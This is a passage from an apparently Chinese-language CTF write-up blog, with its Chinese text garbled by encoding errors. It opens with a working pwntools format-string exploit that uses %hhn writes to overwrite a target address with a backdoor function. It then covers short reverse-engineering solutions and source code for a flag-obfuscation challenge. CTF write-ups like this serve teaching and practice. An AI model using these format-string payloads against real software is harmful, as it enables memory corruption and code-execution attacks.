class="string">&#x27;%&#x27;</span> + <span class="built_in">str</span>(location_arg1) + <span class="string">&#x27;$hhn&#x27;</span></span><br><span class="line">		payload = payload + <span class="string">&#x27;%&#x27;</span> + <span class="built_in">str</span>(c2) + <span class="string">&#x27;c&#x27;</span> + <span class="string">&#x27;%&#x27;</span> + <span class="built_in">str</span>(location_arg2) + <span class="string">&#x27;$hhn&#x27;</span></span><br><span class="line">		payload = payload + <span class="string">&#x27;%&#x27;</span> + <span class="built_in">str</span>(c3) + <span class="string">&#x27;c&#x27;</span> + <span class="string">&#x27;%&#x27;</span> + <span class="built_in">str</span>(location_arg3) + <span class="string">&#x27;$hhn&#x27;</span></span><br><span class="line">		payload = payload + <span class="string">&#x27;%&#x27;</span> + <span class="built_in">str</span>(c4) + <span class="string">&#x27;c&#x27;</span> + <span class="string">&#x27;%&#x27;</span> + <span class="built_in">str</span>(location_arg4) + <span class="string">&#x27;$hhn&#x27;</span></span><br><span class="line">		payload = payload + <span class="string">&#x27;%&#x27;</span> + <span class="built_in">str</span>(c5) + <span class="string">&#x27;c&#x27;</span> + <span class="string">&#x27;%&#x27;</span> + <span class="built_in">str</span>(location_arg5) + <span class="string">&#x27;$hhn&#x27;</span></span><br><span class="line">		payload = payload.ljust(ljust_location,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">	</span><br><span class="line">		payload = payload + p64(target)</span><br><span class="line">		payload = payload + p64(target + <span class="number">0x1</span>)</span><br><span class="line">		payload = payload + p64(target + <span class="number">0x2</span>)</span><br><span class="line">		payload = payload + p64(target + <span class="number">0x3</span>)</span><br><span class="line">		payload = payload + p64(target + <span class="number">0x4</span>)</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> bit == <span class="number">6</span>:</span><br><span class="line">		low1 = (after_change &amp; <span class="number">0xff</span>)</span><br><span class="line">		low2 = (after_change &amp; <span class="number">0xff00</span>) &gt;&gt; <span class="number">8</span></span><br><span class="line">		low3 = (after_change &amp; <span class="number">0xff0000</span>) &gt;&gt; <span class="number">16</span></span><br><span class="line">		low4 = (after_change &amp; <span class="number">0xff000000</span>) &gt;&gt; <span class="number">24</span></span><br><span class="line">		low5 = (after_change &amp; <span class="number">0xff00000000</span>) &gt;&gt; <span class="number">32</span></span><br><span class="line">		low6 = (after_change &amp; <span class="number">0xff0000000000</span>) &gt;&gt; <span class="number">40</span></span><br><span class="line">	</span><br><span class="line">		c1 = (low1 - len_other_string + <span class="number">0x100</span>) % <span class="number">0x100</span></span><br><span class="line">		c2 = (low2 - low1 + <span class="number">0x100</span>) % <span class="number">0x100</span></span><br><span class="line">		c3 = (low3 - low2 + <span class="number">0x100</span>) % <span class="number">0x100</span></span><br><span class="line">		c4 = (low4 - low3 + <span class="number">0x100</span>) % <span class="number">0x100</span></span><br><span class="line">		c5 = (low5 - low4 + <span class="number">0x100</span>) % <span class="number">0x100</span></span><br><span class="line">		c6 = (low6 - low5 + <span class="number">0x100</span>) % <span class="number">0x100</span></span><br><span class="line">	</span><br><span class="line">		location_arg1 = location_arg + ljust_location / <span class="number">0x8</span></span><br><span class="line">		location_arg2 = location_arg1 + <span class="number">1</span></span><br><span class="line">		location_arg3 = location_arg2 + <span class="number">1</span></span><br><span class="line">		location_arg4 = location_arg3 + <span class="number">1</span></span><br><span class="line">		location_arg5 = location_arg4 + <span class="number">1</span></span><br><span class="line">		location_arg6 = location_arg5 + <span class="number">1</span></span><br><span class="line">	</span><br><span class="line">		payload = <span class="string">&#x27;%&#x27;</span> + <span class="built_in">str</span>(c1) + <span class="string">&#x27;c&#x27;</span> + <span class="string">&#x27;%&#x27;</span> + <span class="built_in">str</span>(location_arg1) + <span class="string">&#x27;$hhn&#x27;</span></span><br><span class="line">		payload = payload + <span class="string">&#x27;%&#x27;</span> + <span class="built_in">str</span>(c2) + <span class="string">&#x27;c&#x27;</span> + <span class="string">&#x27;%&#x27;</span> + <span class="built_in">str</span>(location_arg2) + <span class="string">&#x27;$hhn&#x27;</span></span><br><span class="line">		payload = payload + <span class="string">&#x27;%&#x27;</span> + <span class="built_in">str</span>(c3) + <span class="string">&#x27;c&#x27;</span> + <span class="string">&#x27;%&#x27;</span> + <span class="built_in">str</span>(location_arg3) + <span class="string">&#x27;$hhn&#x27;</span></span><br><span class="line">		payload = payload + <span class="string">&#x27;%&#x27;</span> + <span class="built_in">str</span>(c4) + <span class="string">&#x27;c&#x27;</span> + <span class="string">&#x27;%&#x27;</span> + <span class="built_in">str</span>(location_arg4) + <span class="string">&#x27;$hhn&#x27;</span></span><br><span class="line">		payload = payload + <span class="string">&#x27;%&#x27;</span> + <span class="built_in">str</span>(c5) + <span class="string">&#x27;c&#x27;</span> + <span class="string">&#x27;%&#x27;</span> + <span class="built_in">str</span>(location_arg5) + <span class="string">&#x27;$hhn&#x27;</span></span><br><span class="line">		payload = payload + <span class="string">&#x27;%&#x27;</span> + <span class="built_in">str</span>(c6) + <span class="string">&#x27;c&#x27;</span> + <span class="string">&#x27;%&#x27;</span> + <span class="built_in">str</span>(location_arg6) + <span class="string">&#x27;$hhn&#x27;</span></span><br><span class="line">		payload = payload.ljust(ljust_location,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">	</span><br><span class="line">		payload = payload + p64(target)</span><br><span class="line">		payload = payload + p64(target + <span class="number">0x1</span>)</span><br><span class="line">		payload = payload + p64(target + <span class="number">0x2</span>)</span><br><span class="line">		payload = payload + p64(target + <span class="number">0x3</span>)</span><br><span class="line">		payload = payload + p64(target + <span class="number">0x4</span>)</span><br><span class="line">		payload = payload + p64(target + <span class="number">0x5</span>)</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> payload</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span>():</span></span><br><span class="line">    backdoor = <span class="number">0x40129D</span></span><br><span class="line">    dbg()</span><br><span class="line">    payload = format_string_template_64(<span class="number">6</span>, <span class="number">0x404060</span>, backdoor, <span class="number">0</span>, <span class="number">0x50</span>, <span class="number">3</span>)</span><br><span class="line">    ru(<span class="string">&#x27; &gt;&gt;&#x27;</span>)</span><br><span class="line">    sl(payload)</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">exp()</span><br><span class="line">ia()</span><br></pre></td></tr></table></figure>
<h1 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h1><h2 id="Coffee-Shop"><a href="#Coffee-Shop" class="headerlink" title="Coffee Shop"></a>Coffee Shop</h2><p>jadxä¸€æ‹–å°±å‡ºæ¥äº†ï¼Œç®€å•çš„base64</p>
<p><img src="https://s2.loli.net/2023/09/11/aM9xRubKt2vS1Qi.png" alt=""></p>
<h2 id="Patchwork"><a href="#Patchwork" class="headerlink" title="Patchwork"></a>Patchwork</h2><p>é¢˜ç›®è¯´ç¨‹åºçš„æ‰§è¡Œæµæœ‰é—®é¢˜</p>
<p>æ‡’å¾—é€†å‘ï¼Œç›´æ¥åœ¨gdbé‡Œè·³è½¬åˆ°ç›®æ ‡å‡½æ•°ï¼ˆ</p>
<p><img src="https://s2.loli.net/2023/09/11/oExOLZqhjVRzYdQ.png" alt=""></p>
<p><img src="https://s2.loli.net/2023/09/11/tmTYgnH24Swvza7.png" alt=""></p>
<h2 id="garbage"><a href="#garbage" class="headerlink" title="garbage"></a>garbage</h2><p>ç»™äº†æºä»£ç ï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> string <span class="comment"># ++++++++++[&gt;+&gt;+++&gt;+++++++&gt;++++++++++&lt;&lt;&lt;&lt;-]&gt;&gt;&gt;&gt;+++++.++++.+++.-.+++.++.&lt;&lt;++.&gt;&gt;-.+.--.---------.+++++.-------.</span></span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> * <span class="comment"># ++++++++++[&gt;+&gt;+++&gt;+++++++&gt;++++++++++&lt;&lt;&lt;&lt;-]&gt;&gt;&gt;&gt;++.++++++++++++.---.--.&lt;&lt;++.&gt;&gt;+++++.-----------------.+++++++++++++.----------.+++++++++++.--.&lt;&lt;.&gt;&gt;----.++++.+++.-.+++.++.&lt;&lt;.++++++++++.</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">finalstage</span>(<span class="params">w</span>):</span> <span class="comment"># ++++++++++[&gt;+&gt;+++&gt;+++++++&gt;++++++++++&lt;&lt;&lt;&lt;-]&gt;&gt;&gt;&gt;.+.+.&lt;&lt;++.&gt;&gt;.+++.+++++.-------------.+++++++++++.+++++++.+.-------------------.++++++.--.&lt;&lt;++++++++.&gt;&gt;++++++++++++++++++.&lt;&lt;+.&gt;------------.</span></span><br><span class="line">    h=<span class="number">0</span> <span class="comment"># ++++++++++[&gt;+&gt;+++&gt;+++++++&gt;++++++++++&lt;&lt;&lt;&lt;-]&gt;&gt;&gt;&gt;++++.&lt;---------.-------------.</span></span><br><span class="line">    w = <span class="built_in">list</span>(w) <span class="comment"># ++++++++++[&gt;+&gt;+++&gt;+++++++&gt;++++++++++&lt;&lt;&lt;&lt;-]&gt;&gt;&gt;&gt;+++++++++++++++++++.&lt;&lt;++.&gt;---------.&lt;.&gt;&gt;-----------.---.++++++++++.+.&lt;&lt;++++++++.&gt;&gt;+++.&lt;&lt;+.</span></span><br><span class="line">    w.reverse() <span class="comment"># ++++++++++[&gt;+&gt;+++&gt;+++++++&gt;++++++++++&lt;&lt;&lt;&lt;-]&gt;&gt;&gt;&gt;+++++++++++++++++++.&lt;&lt;++++++++++++++++.&gt;&gt;-----.-------------.+++++++++++++++++.-----------------.+++++++++++++.+.--------------.&lt;&lt;------.+.</span></span><br><span class="line">    w = <span class="string">&quot;&quot;</span>.join(g <span class="keyword">for</span> g <span class="keyword">in</span> w) <span class="comment"># ++++++++++[&gt;+&gt;+++&gt;+++++++&gt;++++++++++&lt;&lt;&lt;&lt;-]&gt;&gt;&gt;&gt;+++++++++++++++++++.&lt;&lt;++.&gt;---------.&lt;.++..++++++++++++.&gt;&gt;-------------.+++++.------.+++++.&lt;&lt;------.&gt;&gt;-------.&lt;&lt;--------.&gt;&gt;-.+++++++++.+++.&lt;&lt;.&gt;&gt;-----------.&lt;&lt;.&gt;&gt;++.+++++.&lt;&lt;.&gt;&gt;+++++++++.&lt;&lt;+++++++++.</span></span><br><span class="line">    flag = <span class="string">&#x27;flag&#x27;</span>.replace(<span class="string">&#x27;flag&#x27;</span>, <span class="string">&#x27;galf&#x27;</span>).replace(<span class="string">&#x27;galf&#x27;</span>, <span class="string">&#x27;&#x27;</span>) <span class="comment"># ++++++++++[&gt;+&gt;+++&gt;+++++++&gt;++++++++++&lt;&lt;&lt;&lt;-]&gt;&gt;&gt;&gt;++.++++++.-----------.++++++.&lt;&lt;++.&gt;---------.&lt;.+++++++.&gt;&gt;-.++++++.-----------.++++++.&lt;&lt;.+++++++.&gt;&gt;+++++++++++.-------------.+++++++++++.----.-----------.++.++.&lt;&lt;------.-.&gt;&gt;+.++++++.-----------.++++++.&lt;&lt;.+++++.------------.+++++++.&gt;&gt;.------.+++++++++++.------.&lt;&lt;.++.+++++.&gt;&gt;++++++++++++.-------------.+++++++++++.----.-----------.++.++.&lt;&lt;------.-.&gt;&gt;++.------.+++++++++++.------.&lt;&lt;.+++++.------------.+++++++..++.</span></span><br><span class="line">    <span class="keyword">while</span> h &lt; <span class="built_in">len</span>(w): <span class="comment"># ++++++++++[&gt;+&gt;+++&gt;+++++++&gt;++++++++++&lt;&lt;&lt;&lt;-]&gt;&gt;&gt;&gt;+++++++++++++++++++.---------------.+.+++.-------.&lt;&lt;++.&gt;&gt;+++.&lt;&lt;.&gt;----------.&lt;.&gt;&gt;++++.-------.+++++++++.&lt;&lt;++++++++.&gt;&gt;+++++++++.&lt;&lt;+.&gt;--.</span></span><br><span class="line">        <span class="keyword">try</span>: <span class="comment"># ++++++++++[&gt;+&gt;+++&gt;+++++++&gt;++++++++++&lt;&lt;&lt;&lt;-]&gt;&gt;&gt;&gt;++++++++++++++++.--.+++++++.&lt;------------.</span></span><br><span class="line">            flag += w[h+<span class="number">1</span>] + w[h] <span class="comment"># ++++++++++[&gt;+&gt;+++&gt;+++++++&gt;++++++++++&lt;&lt;&lt;&lt;-]&gt;&gt;&gt;&gt;++.++++++.-----------.++++++.&lt;&lt;++.+++++++++++.&gt;---------.&lt;-----------.&gt;&gt;++++++++++++++++.----------------------------.+++++++++++++.&lt;&lt;+++++++++++.++++++.&gt;&gt;-----------.&lt;&lt;-----------------.+++++++++++.-----------.&gt;&gt;++++++++++++++++++++++++++.----------------------------.+++++++++++++.-----------.</span></span><br><span class="line">        <span class="keyword">except</span>: <span class="comment"># ++++++++++[&gt;+&gt;+++&gt;+++++++&gt;++++++++++&lt;&lt;&lt;&lt;-]&gt;&gt;&gt;&gt;+.+++++++++++++++++++.---------------------.++.+++++++++++.++++.&lt;------------.</span></span><br><span class="line">            flag += w[h] <span class="comment"># ++++++++++[&gt;+&gt;+++&gt;+++++++&gt;++++++++++&lt;&lt;&lt;&lt;-]&gt;&gt;&gt;&gt;++.++++++.-----------.++++++.&lt;&lt;++.+++++++++++.&gt;---------.&lt;-----------.&gt;&gt;++++++++++++++++.----------------------------.+++++++++++++.-----------.</span></span><br><span class="line">        h+=<span class="number">2</span> <span class="comment"># ++++++++++[&gt;+&gt;+++&gt;+++++++&gt;++++++++++&lt;&lt;&lt;&lt;-]&gt;&gt;&gt;&gt;++++.&lt;&lt;+++++++++++++.&gt;---------.&lt;+++++++.</span></span><br><span class="line">    print(<span class="string">&quot;Final Stage complete&quot;</span>) <span class="comment"># ++++++++++[&gt;+&gt;+++&gt;+++++++&gt;++++++++++&lt;&lt;&lt;&lt;-]&gt;&gt;&gt;&gt;++++++++++++.++.---------.+++++.++++++.&lt;&lt;++++++++++.------.&gt;.&gt;-----------.+++++.-------------.+++++++++++.&lt;&lt;--.&gt;+++++++++++++.&gt;++++++++.&lt;++++++++++++++.++++++.--.&lt;.&gt;--.&gt;-----.--.+++.----.&lt;++.&gt;++++++++.&lt;.&lt;++.+++++++.</span></span><br><span class="line">    <span class="keyword">return</span> flag <span class="comment"># ++++++++++[&gt;+&gt;+++&gt;+++++++&gt;++++++++++&lt;&lt;&lt;&lt;-]&gt;&gt;&gt;&gt;++++++++++++++.-------------.+++++++++++++++.+.---.----.&lt;&lt;++.&gt;&gt;--------.++++++.-----------.++++++.</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">stage2</span>(<span class="params">b</span>):</span> <span class="comment"># ++++++++++[&gt;+&gt;+++&gt;+++++++&gt;++++++++++&lt;&lt;&lt;&lt;-]&gt;&gt;&gt;&gt;.+.+.&lt;&lt;++.&gt;&gt;+++++++++++++.+.-------------------.++++++.--.&lt;&lt;++++++++++++++++++.----------.&gt;&gt;---.&lt;&lt;+.&gt;------------.</span></span><br><span class="line">    t = <span class="string">&quot;++++++++++[&gt;+&gt;+++&gt;+++++++&gt;++++++++++&lt;&lt;&lt;&lt;-]&gt;&gt;&gt;&gt;++.++++++.-----------.++++++.&quot;</span>[-<span class="number">15</span>:(<span class="number">7</span>*<span class="number">9</span>)].strip(<span class="string">&#x27;-&#x27;</span>) <span class="comment"># ++++++++++[&gt;+&gt;+++&gt;+++++++&gt;++++++++++&lt;&lt;&lt;&lt;-]&gt;&gt;&gt;&gt;++++++++++++++++.&lt;&lt;++.&gt;---------.&lt;.++.+++++++++..........&gt;&gt;-------------------------.&lt;+.&lt;.&gt;.&lt;...&gt;.&lt;.......&gt;.&lt;..........&gt;--....&lt;++.&gt;&gt;++.&lt;++....&lt;--..+++.---......+++.-...........+.---......+++.------------.&gt;&gt;--.&lt;&lt;+++++++++++.++++.++++.&gt;----.&lt;-------------.&gt;---.&lt;++.&gt;++.&lt;-.&gt;&gt;++.&lt;&lt;+++++.&gt;&gt;++++++++++++++++++++++.+.--.---------.+++++++.&lt;&lt;------.-.++++++.------.++.</span></span><br><span class="line">    <span class="keyword">for</span> q <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(b)): <span class="comment"># ++++++++++[&gt;+&gt;+++&gt;+++++++&gt;++++++++++&lt;&lt;&lt;&lt;-]&gt;&gt;&gt;&gt;++.+++++++++.+++.&lt;&lt;++.&gt;&gt;-.&lt;&lt;.&gt;&gt;--------.+++++.&lt;&lt;.&gt;&gt;++++.-----------------.+++++++++++++.-------.--.&lt;&lt;++++++++.&gt;&gt;+++++++.-------.+++++++++.&lt;&lt;.&gt;&gt;------------.&lt;&lt;+..&gt;------------.</span></span><br><span class="line">        t += <span class="built_in">chr</span>(<span class="built_in">ord</span>(b[q]) - randint(<span class="number">0</span>,<span class="number">5</span>)) <span class="comment"># ++++++++++[&gt;+&gt;+++&gt;+++++++&gt;++++++++++&lt;&lt;&lt;&lt;-]&gt;&gt;&gt;&gt;++++++++++++++++.&lt;&lt;++.+++++++++++.&gt;---------.&lt;-----------.&gt;&gt;-----------------.+++++.++++++++++.&lt;&lt;++++++++.&gt;&gt;---.+++.--------------.&lt;&lt;.&gt;&gt;--.-------.++++++++++++++++++++++.--------------------.&lt;&lt;+.++++.&gt;&gt;+++++++++++++++++++++.-----------------.+++++++++++++.----------.+++++.+++++.++++++.&lt;&lt;-----.++++++++.----.&gt;--------.&lt;---..</span></span><br><span class="line">    print(<span class="string">&quot;Stage 2 complete&quot;</span>) <span class="comment"># ++++++++++[&gt;+&gt;+++&gt;+++++++&gt;++++++++++&lt;&lt;&lt;&lt;-]&gt;&gt;&gt;&gt;++++++++++++.++.---------.+++++.++++++.&lt;&lt;++++++++++.------.&gt;+++++++++++++.&gt;.&lt;++++++++++++++.++++++.--.&lt;--.++++++++++++++++++.------------------.&gt;--.&gt;-----.--.+++.----.&lt;++.&gt;++++++++.&lt;.&lt;++.+++++++.</span></span><br><span class="line">    flag = finalstage(t) <span class="comment"># ++++++++++[&gt;+&gt;+++&gt;+++++++&gt;++++++++++&lt;&lt;&lt;&lt;-]&gt;&gt;&gt;&gt;++.++++++.-----------.++++++.&lt;&lt;++.&gt;---------.&lt;.&gt;&gt;-.+++.+++++.-------------.+++++++++++.+++++++.+.-------------------.++++++.--.&lt;&lt;++++++++.&gt;&gt;+++++++++++++++.&lt;&lt;+.</span></span><br><span class="line">    <span class="keyword">return</span> flag <span class="comment"># ++++++++++[&gt;+&gt;+++&gt;+++++++&gt;++++++++++&lt;&lt;&lt;&lt;-]&gt;&gt;&gt;&gt;++++++++++++++.-------------.+++++++++++++++.+.---.----.&lt;&lt;++.&gt;&gt;--------.++++++.-----------.++++++.</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">stage1</span>(<span class="params">a</span>):</span> <span class="comment"># ++++++++++[&gt;+&gt;+++&gt;+++++++&gt;++++++++++&lt;&lt;&lt;&lt;-]&gt;&gt;&gt;&gt;.+.+.&lt;&lt;++.&gt;&gt;+++++++++++++.+.-------------------.++++++.--.&lt;&lt;+++++++++++++++++.---------.&gt;&gt;----.&lt;&lt;+.&gt;------------.</span></span><br><span class="line">    a = <span class="built_in">list</span>(a) <span class="comment"># ++++++++++[&gt;+&gt;+++&gt;+++++++&gt;++++++++++&lt;&lt;&lt;&lt;-]&gt;&gt;&gt;&gt;---.&lt;&lt;++.&gt;---------.&lt;.&gt;&gt;+++++++++++.---.++++++++++.+.&lt;&lt;++++++++.&gt;&gt;-------------------.&lt;&lt;+.</span></span><br><span class="line">    b = <span class="built_in">list</span>(string.ascii_lowercase) <span class="comment"># ++++++++++[&gt;+&gt;+++&gt;+++++++&gt;++++++++++&lt;&lt;&lt;&lt;-]&gt;&gt;&gt;&gt;--.&lt;&lt;++.&gt;---------.&lt;.&gt;&gt;++++++++++.---.++++++++++.+.&lt;&lt;++++++++.&gt;&gt;-.+.--.---------.+++++.-------.&lt;&lt;++++++.&gt;&gt;------.++++++++++++++++++.----------------.++++++..----------.+++++++++++++.+++.++++++++.------------------.+++++++++++++.---------------.--.++++++++++++++++++.--------------.&lt;&lt;-----.</span></span><br><span class="line">    <span class="keyword">for</span> o <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(a)): <span class="comment"># ++++++++++[&gt;+&gt;+++&gt;+++++++&gt;++++++++++&lt;&lt;&lt;&lt;-]&gt;&gt;&gt;&gt;++.+++++++++.+++.&lt;&lt;++.&gt;&gt;---.&lt;&lt;.&gt;&gt;------.+++++.&lt;&lt;.&gt;&gt;++++.-----------------.+++++++++++++.-------.--.&lt;&lt;++++++++.&gt;&gt;+++++++.-------.+++++++++.&lt;&lt;.&gt;&gt;-------------.&lt;&lt;+..&gt;------------.</span></span><br><span class="line">        a[o] = <span class="built_in">chr</span>(<span class="built_in">ord</span>(a[o])^o) <span class="comment"># ++++++++++[&gt;+&gt;+++&gt;+++++++&gt;++++++++++&lt;&lt;&lt;&lt;-]&gt;&gt;&gt;&gt;---.------.++++++++++++++++++++.------------------.&lt;&lt;++.&gt;---------.&lt;.&gt;&gt;++++++.+++++.++++++++++.&lt;&lt;++++++++.&gt;&gt;---.+++.--------------.&lt;&lt;.&gt;&gt;---.------.++++++++++++++++++++.------------------.&lt;&lt;+.&gt;&gt;+.+++++++++++++++++.&lt;&lt;</span></span><br><span class="line">    z = <span class="string">&quot;&quot;</span>.join(x <span class="keyword">for</span> x <span class="keyword">in</span> a) <span class="comment"># ++++++++++[&gt;+&gt;+++&gt;+++++++&gt;++++++++++&lt;&lt;&lt;&lt;-]&gt;&gt;&gt;&gt;++++++++++++++++++++++.&lt;&lt;++.&gt;---------.&lt;.++..++++++++++++.&gt;&gt;----------------.+++++.------.+++++.&lt;&lt;------.&gt;&gt;++++++++++.&lt;&lt;--------.&gt;&gt;------------------.+++++++++.+++.&lt;&lt;.&gt;&gt;++++++.&lt;&lt;.&gt;&gt;---------------.+++++.&lt;&lt;.&gt;&gt;-------------.&lt;&lt;+++++++++.</span></span><br><span class="line">    <span class="keyword">for</span> y <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(z)): <span class="comment"># ++++++++++[&gt;+&gt;+++&gt;+++++++&gt;++++++++++&lt;&lt;&lt;&lt;-]&gt;&gt;&gt;&gt;++.+++++++++.+++.&lt;&lt;++.&gt;&gt;+++++++.&lt;&lt;.&gt;&gt;----------------.+++++.&lt;&lt;.&gt;&gt;++++.-----------------.+++++++++++++.-------.--.&lt;&lt;++++++++.&gt;&gt;+++++++.-------.+++++++++.&lt;&lt;.&gt;&gt;++++++++++++.&lt;&lt;+..&gt;------------.</span></span><br><span class="line">        b[y%<span class="built_in">len</span>(b)] = <span class="built_in">chr</span>((  <span class="built_in">ord</span>(z[y]) ^ <span class="built_in">ord</span>(a[y]) ) + <span class="built_in">len</span>(b)  ) <span class="comment"># ++++++++++[&gt;+&gt;+++&gt;+++++++&gt;++++++++++&lt;&lt;&lt;&lt;-]&gt;&gt;&gt;&gt;--.-------.++++++++++++++++++++++++++++++.&lt;&lt;+++++++.&gt;&gt;-------------.-------.+++++++++.&lt;&lt;+++.&gt;&gt;------------.&lt;&lt;+.&gt;&gt;-----.&lt;&lt;---------.&gt;---------.&lt;.&gt;&gt;++++++.+++++.++++++++++.&lt;&lt;++++++++..&gt;&gt;---.+++.--------------.&lt;&lt;.&gt;&gt;++++++++++++++++++++++.&lt;++++++++++++++++++++++++++++++.&gt;-.&lt;++.&lt;+.&gt;+.&gt;----------.+++.&lt;++++++.&lt;-.&gt;---.------.&gt;+++++++.&lt;++.&lt;+..++.&gt;&gt;-------------.-------.+++++++++.&lt;&lt;---.&gt;+++++.&lt;+..</span></span><br><span class="line">    print(<span class="string">&quot;Stage 1 complete&quot;</span>) <span class="comment"># ++++++++++[&gt;+&gt;+++&gt;+++++++&gt;++++++++++&lt;&lt;&lt;&lt;-]&gt;&gt;&gt;&gt;++++++++++++.++.---------.+++++.++++++.&lt;&lt;++++++++++.------.&gt;+++++++++++++.&gt;.&lt;++++++++++++++.++++++.--.&lt;--.+++++++++++++++++.-----------------.&gt;--.&gt;-----.--.+++.----.&lt;++.&gt;++++++++.&lt;.&lt;++.+++++++.</span></span><br><span class="line">    flag = stage2(z) <span class="comment"># ++++++++++[&gt;+&gt;+++&gt;+++++++&gt;++++++++++&lt;&lt;&lt;&lt;-]&gt;&gt;&gt;&gt;++.++++++.-----------.++++++.&lt;&lt;++.&gt;---------.&lt;.&gt;&gt;++++++++++++.+.-------------------.++++++.--.&lt;-----------.&lt;++++++++.&gt;&gt;+++++++++++++++++++++.&lt;&lt;+.</span></span><br><span class="line">    <span class="keyword">return</span> flag <span class="comment"># ++++++++++[&gt;+&gt;+++&gt;+++++++&gt;++++++++++&lt;&lt;&lt;&lt;-]&gt;&gt;&gt;&gt;++++++++++++++.-------------.+++++++++++++++.+.---.----.&lt;&lt;++.&gt;&gt;--------.++++++.-----------.++++++.</span></span><br><span class="line"><span class="comment"># QBPKxH.u&quot;F1fRy3U[bM36j]QvS=03*]o0feA|</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">entry</span>(<span class="params">f</span>):</span> <span class="comment"># ++++++++++[&gt;+&gt;+++&gt;+++++++&gt;++++++++++&lt;&lt;&lt;&lt;-]&gt;&gt;&gt;&gt;.+.+.&lt;&lt;++.&gt;&gt;-.+++++++++.++++++.--.+++++++.&lt;&lt;++++++++.&gt;&gt;-------------------.&lt;&lt;+.&gt;------------.</span></span><br><span class="line">    seed(<span class="number">10</span>) <span class="comment"># ++++++++++[&gt;+&gt;+++&gt;+++++++&gt;++++++++++&lt;&lt;&lt;&lt;-]&gt;&gt;&gt;&gt;+++++++++++++++.--------------..-.&lt;&lt;++++++++++.+++++++++.-.-------.</span></span><br><span class="line">    f = <span class="built_in">list</span>(f) <span class="comment"># ++++++++++[&gt;+&gt;+++&gt;+++++++&gt;++++++++++&lt;&lt;&lt;&lt;-]&gt;&gt;&gt;&gt;++.&lt;&lt;++.&gt;---------.&lt;.&gt;&gt;++++++.---.++++++++++.+.&lt;&lt;++++++++.&gt;&gt;--------------.&lt;&lt;+.</span></span><br><span class="line">    f.reverse() <span class="comment"># ++++++++++[&gt;+&gt;+++&gt;+++++++&gt;++++++++++&lt;&lt;&lt;&lt;-]&gt;&gt;&gt;&gt;++.&lt;&lt;++++++++++++++++.&gt;&gt;++++++++++++.-------------.+++++++++++++++++.-----------------.+++++++++++++.+.--------------.&lt;&lt;------.+.</span></span><br><span class="line">    f = <span class="string">&quot;&quot;</span>.join(i <span class="keyword">for</span> i <span class="keyword">in</span> f) <span class="comment"># ++++++++++[&gt;+&gt;+++&gt;+++++++&gt;++++++++++&lt;&lt;&lt;&lt;-]&gt;&gt;&gt;&gt;++.&lt;&lt;++.&gt;---------.&lt;.++..++++++++++++.&gt;&gt;++++.+++++.------.+++++.&lt;&lt;------.&gt;&gt;-----.&lt;&lt;--------.&gt;&gt;---.+++++++++.+++.&lt;&lt;.&gt;&gt;---------.&lt;&lt;.&gt;&gt;.+++++.&lt;&lt;.&gt;&gt;--------.&lt;&lt;+++++++++.</span></span><br><span class="line">    print(<span class="string">&quot;Entry complete&quot;</span>) <span class="comment"># ++++++++++[&gt;+&gt;+++&gt;+++++++&gt;++++++++++&lt;&lt;&lt;&lt;-]&gt;&gt;&gt;&gt;++++++++++++.++.---------.+++++.++++++.&lt;&lt;++++++++++.------.&gt;-.&gt;------.++++++.--.+++++++.&lt;&lt;--.&gt;&gt;----------------------.++++++++++++.--.+++.----.-------.+++++++++++++++.---------------.&lt;&lt;++.+++++++.</span></span><br><span class="line">    flag = stage1(f) <span class="comment"># ++++++++++[&gt;+&gt;+++&gt;+++++++&gt;++++++++++&lt;&lt;&lt;&lt;-]&gt;&gt;&gt;&gt;++.++++++.-----------.++++++.&lt;&lt;++.&gt;---------.&lt;.&gt;&gt;++++++++++++.+.-------------------.++++++.--.&lt;------------.&lt;++++++++.&gt;&gt;+.&lt;&lt;+.</span></span><br><span class="line">    <span class="keyword">return</span> flag <span class="comment"># ++++++++++[&gt;+&gt;+++&gt;+++++++&gt;++++++++++&lt;&lt;&lt;&lt;-]&gt;&gt;&gt;&gt;++++++++++++++.-------------.+++++++++++++++.+.---.----.&lt;&lt;++.&gt;&gt;--------.++++++.-----------.++++++.</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:<span class="comment"># ++++++++++[&gt;+&gt;+++&gt;+++++++&gt;++++++++++&lt;&lt;&lt;&lt;-]&gt;&gt;&gt;&gt;+++++.---.&lt;&lt;++.&gt;&gt;-------..+++++++++++++++.-------------.++++++++++++.--------.------..&lt;&lt;.&gt;---------..&lt;.+++++++.&gt;&gt;..++++++++++++++.------------.++++++++.+++++.---------------..&lt;&lt;.&gt;---.</span></span><br><span class="line">    <span class="comment"># input = entry(input(&quot;Enter Flag: &quot;)) # ++++++++++[&gt;+&gt;+++&gt;+++++++&gt;++++++++++&lt;&lt;&lt;&lt;-]&gt;&gt;&gt;&gt;+++++.+++++.++.+++++.-.&lt;&lt;++.&gt;---------.&lt;.&gt;&gt;---------------.+++++++++.++++++.--.+++++++.&lt;&lt;++++++++.&gt;&gt;----------------.+++++.++.+++++.-.&lt;&lt;.------.&gt;++++++++.&gt;------.++++++.---------------.+++++++++++++.&lt;&lt;--.&gt;+.&gt;------.-----------.++++++.&lt;------------.&lt;.++.+++++++..</span></span><br><span class="line">    <span class="built_in">input</span> = entry(<span class="string">&#x27;QBPKxH.u&quot;F1fRy3U[bM36j]QvS=03*]o0feA|&#x27;</span>) <span class="comment"># 